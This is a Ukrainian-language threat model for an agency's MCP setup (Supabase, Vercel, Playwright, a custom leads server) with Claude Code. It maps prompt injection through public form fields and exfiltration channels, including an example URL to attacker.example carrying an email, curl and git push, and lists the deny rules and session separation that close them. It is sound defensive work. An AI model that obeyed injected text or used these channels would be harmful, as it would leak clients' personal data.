# Threat model: MCP-інтеграції LeadDesk (Task D)

Спирається на `.mcp.json` і `.claude/settings.json` цього репозиторію (Task B) і на сервер
`mcp/leaddesk-server/` (Task A). Підключені сервери: `supabase`, `vercel`, `playwright`, `leaddesk`.

**Правило агенції:** клієнтський проєкт до агента напряму не підключаємо. Працюємо з окремого акаунта
без клієнтських організацій і команд: одноразовий проєкт Supabase, особистий Vercel (застереження — у
таблиці заборон), синтетичні дані.
До системи клієнта агент ходить лише через вузький доменний сервер на кшталт `leaddesk`.

## Які дані бачить агент

| Сервер | Що потрапляє в контекст агента | Чиї це дані | Чи є там текст, який написали треті особи |
|---|---|---|---|
| `supabase` | Схема (`list_tables`), будь-які рядки через `execute_sql`: імена, email, тексти заявок лідів, бюджети; результати міграцій; документація Supabase (`search_docs`); URL проєкту й publishable key (`development`). Перевірено: `execute_sql` працює під роллю `postgres` (`is_superuser = off`), а вона власник таблиці, тож RLS на агента не діє | Клієнта і його кінцевих користувачів (ліди — персональні дані) | **Так**: `message` і `full_name` пише будь-який відвідувач публічної форми. Це головне джерело prompt injection у стеку |
| `vercel` | Список і стан деплоїв, логи білду й рантайму, конфіг проєкту, коментарі toolbar, документація Vercel. У `/mcp` 238 інструментів. У нашій сесії токен прочитав проєкт і деплої (`get_project`, `list_deployments`), а логи — ні: 403 на scope команди | Агенції й клієнта: логи можуть містити шляхи, назви змінних, фрагменти запитів | **Так**: логи рантайму містять дані з запитів відвідувачів; коментарі toolbar пишуть клієнт і колеги |
| `playwright` | Знімки доступності (`browser_snapshot`), скріншоти, консоль і мережа сторінок, які відкриває агент (зокрема заголовки й тіла запитів через `browser_network_request`) | Будь-чиї: усе, що є на відкритій сторінці | **Так**: кожна сторінка — недовірений текст, зокрема прихований від людини |
| `leaddesk` | Лише `id`, `company`, `status`, `source`, `budget`, `createdAt` лідів; ресурс зі статусами; власний запис аудиту | Клієнта, вже звужені: без імен, email і текстів заявок | Майже ні: назва компанії — єдине поле, яке ввів відвідувач. Тексти заявок агент не бачить |
| Конектори claude.ai (CRM, документи, автоматизації) | Картки й нотатки CRM, документи, сценарії автоматизацій з акаунта claude.ai. Claude Code підтягував їх у кожну сесію Task B автоматично, це видно в журналах сесій | Агенції та її клієнтів | **Так**: листування, нотатки й картки клієнтів |
| Пам'ять Claude Code (`~/.claude/projects/…/memory`) | Нотатка проєкту, яку кожна сесія читає на старті. Агент перевірки форми сам дописав у неї рядок | Наші робочі нотатки | Ні, але це канал між сесіями: що записала одна сесія, наступна прочитає як контекст |

Усе, що бачить агент, потрапляє в контекст моделі, тобто до провайдера LLM (Anthropic).

## Канали виносу в цій же сесії

Lethal trifecta з нашого стеку: Supabase дає приватні дані й недовірений текст з форми, а Vercel,
браузер і вбудовані інструменти Claude Code — канали назовні. Тому сесії розділені (див. `connections.md`):
в одній сесії — щонайбільше один сервер із правом запису, браузер ніколи не працює разом із Supabase.

| Канал | Звідки (сервер або вбудований інструмент) | Як ним можна винести дані | Закрито? Чим саме |
|---|---|---|---|
| `browser_navigate` на адресу з даними в query (`https://attacker.example/?d=<email>`) | `playwright` | GET-запит зі скопійованими з бази даними; лог сервера атакувальника їх зберігає | **Частково.** `--allowed-origins http://localhost:3000` — лише зручність, вендор прямо каже, що це не межа безпеки й на редиректи не діє. Головний захід — Playwright ніколи не в одній сесії з Supabase; `browser_navigate` в `allow`, тож у браузерній сесії не питає |
| `browser_run_code_unsafe`, `browser_evaluate` | `playwright` | Довільний JS: `fetch` будь-куди, у процесі сервера — повз правила `Bash` | **Так**: обидва в `deny` у `.claude/settings.json` |
| `browser_file_upload`, `browser_drop` | `playwright` | Завантажити файл проєкту (зокрема `.env.local`) у форму на сторонній сторінці | **Так**: обидва в `deny` |
| `webmcp_*` | `playwright` | Сторінка сама реєструє інструменти з описами, які пише її автор | **Так**: прапорець `--no-webmcp` і `deny` на `mcp__playwright__webmcp_*` |
| `deploy_to_vercel` з `target: preview` / `production` | `vercel` | Задеплоїти код із вбудованими даними на публічний `*.vercel.app` | **Так**: `deny`. Але див. `use_vercel_cli` нижче |
| `get_access_to_vercel_url` | `vercel` | Посилання в обхід Deployment Protection — роздати закритий preview назовні | **Так**: `deny` |
| `reply_to_toolbar_thread`, `edit_toolbar_message` | `vercel` | Написати дані в коментар, який бачить клієнт і всі учасники проєкту | **Так**: `deny` на всі чотири toolbar-інструменти |
| `use_vercel_cli` → `Bash: vercel env pull / deploy` | `vercel` + вбудований `Bash` | Інструмент MCP нічого не виконує сам, а скеровує модель у `Bash`, де діє токен локального CLI | **Ні, правилом не закрито.** Захід — Vercel CLI на цій машині не залогінений у робочий акаунт (див. `connections.md`); кожен `Bash` питає схвалення |
| `WebFetch` | вбудований у Claude Code | GET на будь-яку адресу з даними в URL | **Ні, правилом не закрито**: кожен виклик питає схвалення; людина має читати URL |
| `Bash` (`curl`, `git push`, `npx …`) | вбудований у Claude Code | Будь-який мережевий запит із даними; `git push` у публічний репозиторій | **Ні, правилом не закрито**: схвалення на кожен виклик; правило в `AGENTS.md` «нічого не залишає машину без явного так» |
| Інструменти конекторів claude.ai: нотатка в CRM, документ у Drive, запуск сценарію автоматизації | конектори claude.ai | Записати дані з бази чи сторінки в систему, яку бачать інші люди, — не браузерний канал | **Так, з цього моменту**: `"disableClaudeAiConnectors": true` у `.claude/settings.json`, а для прогонів Task C — `ENABLE_CLAUDEAI_MCP_SERVERS=false`. У сесіях Task B канал був відкритий (журнали), але агенти ним не скористалися |
| Файли в репозиторії (`Write` у `docs/…` + коміт) | вбудований у Claude Code | Агент записує рядки з бази у файл, файл потрапляє в публічний PR | **Частково**: ревʼю диффу людиною; `.gitignore` для `.playwright-mcp/` і `body.json`; результати `list_*` не комітимо |

## Що ми забороняємо і чим саме

| Що заборонено | Механізм: deny, URL, прапорець, окремий акаунт, окрема сесія | Де це видно: файл і рядок | Чого цей механізм НЕ закриває |
|---|---|---|---|
| Доступ до інших проєктів і організацій Supabase | URL: `project_ref=…` | `.mcp.json`, `mcpServers.supabase.url` | Сам OAuth-токен видано на акаунт: з іншим URL або в іншому клієнті він бачить усі проєкти акаунта. Тому акаунт одноразовий |
| `account`-інструменти, Edge Functions, гілки Supabase | URL: `features=database,development,docs` (без `account`, `functions`, `branching`) | `.mcp.json`, `mcpServers.supabase.url` | `execute_sql` лишається: агент читає й пише будь-яку таблицю проєкту з правами власника, повз RLS |
| Запис у Supabase у прогоні A (Task C) | URL: `read_only=true&features=database,docs` | команда `claude mcp add` у `ab-generic-vs-domain.md` | `read_only=true` не прибирає `execute_sql` і читання: агент однаково бачить усі персональні дані |
| Автосхвалення SQL | `execute_sql` і `apply_migration` не в `allow` | `.claude/settings.json`, `permissions.allow` | Людина, яка схвалює 20-рядковий SQL, читає його за пів секунди. Зміст запиту не перевіряє ніхто, крім неї |
| 11 інструментів Vercel, що змінюють стан (`buy_*`, `deploy_to_vercel`, `get_access_to_vercel_url`, `import-claude-design-from-url`, 4 toolbar) | `deny` точними іменами | `.claude/settings.json`, `permissions.deny` | Токен Vercel — це користувач цілком (скоуп `openid`); з іншого клієнта чи після перейменування сервера в `.mcp.json` правила мовчки перестають діяти. `use_vercel_cli` → `Bash` правилами не закрито |
| `browser_run_code_unsafe`, `browser_evaluate`, `browser_file_upload`, `browser_drop`, `webmcp_*` | `deny` | `.claude/settings.json`, `permissions.deny` | Захист лише на боці Claude Code. Ядро Playwright вмикається завжди; інший клієнт (Cursor) з тим самим `.mcp.json` має ці інструменти |
| Інструменти, які додає сторінка | Прапорець `--no-webmcp` | `.mcp.json`, `mcpServers.playwright.args` | Текст самої сторінки однаково потрапляє в контекст через `browser_snapshot` |
| Логіни й cookies з минулих сесій у браузері | Прапорець `--isolated`; без `--extension`, `--cdp-endpoint`, `--user-data-dir`; правило «у браузер агента не логінимось» | `.mcp.json`, `mcpServers.playwright.args`; `AGENTS.md` | Сесія, у якій людина сама залогінилась у браузері агента, живе до закриття вікна |
| Неочікувані оновлення серверів | Точна версія `@playwright/mcp@0.0.82`, жодного `@latest`; точні версії `@modelcontextprotocol/server` і `zod` у `leaddesk` | `.mcp.json`; `mcp/leaddesk-server/package.json` | Віддалені сервери (Supabase, Vercel) оновлює вендор, без нашого відома; їхні описи інструментів можуть змінитися будь-коли |
| Supabase і браузер в одній сесії; два записуючі сервери в одній сесії | Окрема сесія на крок, перемикач у `/mcp` | `connections.md`, «Сесії: що вмикаємо разом»; `AGENTS.md` | Це дисципліна, а не технічний механізм: `claude -p` у цій теці піднімає **всі** сервери з закоміченого `.mcp.json` разом і без питань. Журнали показали, що дисципліна вже раз не втрималась: у сесії знімка «до» `supabase` і `vercel` лишились увімкненими разом із `playwright` |
| Конектори claude.ai в сесіях проєкту | `"disableClaudeAiConnectors": true` | `.claude/settings.json`, корінь файла | Діє лише в цьому репозиторії й лише для Claude Code: в інших теках і в самому claude.ai конектори на місці. У Task B цього налаштування ще не було, і конектори були в кожній сесії |
| Автоматичне схвалення викликів (auto mode: класифікатор сам схвалює «рутинні» дії) | `"permissions": { "defaultMode": "default" }` | `.claude/settings.json`, `permissions.defaultMode` | Людина може перемкнути режим через Shift+Tab або запустити `claude --permission-mode …`, а прапорець CLI сильніший за налаштування проєкту. Сесії Task B за замовчуванням стартували саме в auto mode |
| Доступ токена Vercel до команди, де є інші проєкти | OAuth не розширювали на команду; лог білду взяли з дашборда | `connections.md`, «Vercel» | Токен однаково прочитав `get_project` і `list_deployments` цього проєкту. Що ще він бачить у команді, ми не перевіряли. Надійний захід — окремий акаунт Vercel без чужих проєктів |
| Публікація MCP-сервера в інтернет | Відмова від «multi-service» імпорту у Vercel; Root Directory — корінь, Framework Preset — Next.js | `connections.md`, «Vercel» | Vercel сам запропонував задеплоїти `mcp/leaddesk-server` як сервіс, і перший імпорт таки взяв цю теку. Наслідків не було лише тому, що stdio-серверу нема чим слухати HTTP, а деплой закритий Vercel Authentication |
| Імена, email, тексти заявок в інструментах ведення лідів | Вузький контракт `leaddesk`: лише 6 полів, статус з переліку, аудит на кожну зміну | `mcp/leaddesk-server/src/server.mjs`, `publicLead` | Якщо в ту саму сесію підключено ще й Supabase, агент дістане ці поля через `execute_sql` |
| Доступ до клієнтських систем | Окремий акаунт без клієнтських організацій; синтетичні дані | Розділ «Правило агенції» вище; `connections.md` | Екран згоди Supabase показує всі організації акаунта: робочий логін з клієнтськими організаціями сюди не годиться |
| Сервери іншого проєкту з батьківської теки | Ключ `supabase` у нашому `.mcp.json` перекриває однойменний запис батьківської теки; теки A/B — поза обома проєктами | `.mcp.json`; `ab-generic-vs-domain.md`, налаштування | Спостереження на цій машині: репозиторій лежить усередині теки іншого проєкту, і Claude Code підхопив її `.mcp.json` (`claude mcp get supabase` → «Project config», хоча в нашому репозиторії `.mcp.json` ще не було). Однойменний ключ перекриває лише цей запис; будь-який інший сервер звідти з'явився б у сесії, а в `claude -p` — без питань. Сервери зі скоупом `user` видно в кожній теці — їх лише вимикаємо в `/mcp` |
| Читання секретів | `AGENTS.md`: `.env*` не відкривати; `deny` на `browser_file_upload` | `AGENTS.md`, «Безпека»; `.claude/settings.json` | `Read` і `Bash` технічно можуть прочитати `.env.local`; закриває лише інструкція й схвалення людини |

## Що пишемо в договір

- **Які системи підключаємо і з якими правами.** До продакшн-бази клієнта агент напряму не
  підключається. Для ведення лідів — лише доменний сервер з двома діями (знайти ліди за статусом,
  змінити статус з аудитом), без доступу до імен, email і текстів заявок. Для розробки — копія схеми
  із синтетичними даними в нашому окремому проєкті.
- **Чиї акаунти.** Агент працює з окремих акаунтів агенції (Supabase, Vercel, Figma) без клієнтських
  організацій і команд; власник — тімлід агенції. Клієнтські акаунти, токени й організації до агента
  не підключаємо.
- **Середовище агента.** У робочих теках проєкту вимкнено конектори claude.ai та автоматичне схвалення
  викликів (`.claude/settings.json`). Кожен виклик, що змінює дані, схвалює людина. Проєкти навчальні й
  клієнтські не лежать одна в одній: батьківська тека підмішує свої MCP-сервери.
- **Куди їдуть дані.** Усе, що бачить агент, передається провайдеру LLM (Anthropic) і вендорам
  підключених серверів (Supabase, Vercel). Перелік вендорів і їхні умови обробки даних — додаток до договору.
- **Supabase MCP — інструмент розробника.** Він працює з правами власника проєкту, повз RLS. Клієнту
  чи його кінцевим користувачам такий доступ не надається й не вбудовується в продукт.
- **Figma**, якщо використовуємо: на планах Starter і Professional content training за замовчуванням
  увімкнено; для файлів клієнта вимикаємо його або працюємо з копією макета в нашому акаунті.
- **Що агент може змінювати.** Лише статус ліда через `leaddesk`, і кожна зміна — після підтвердження
  людини, із записом в аудиті. Деплоїв, оплат і публікацій агент не робить: це заборонено в конфігу.
- **Інциденти.** Якщо токен вкрадено, ми відкликаємо OAuth-доступ сервера (`claude mcp remove`,
  відкликання в дашборді вендора) і повідомляємо клієнта протягом 24 годин.
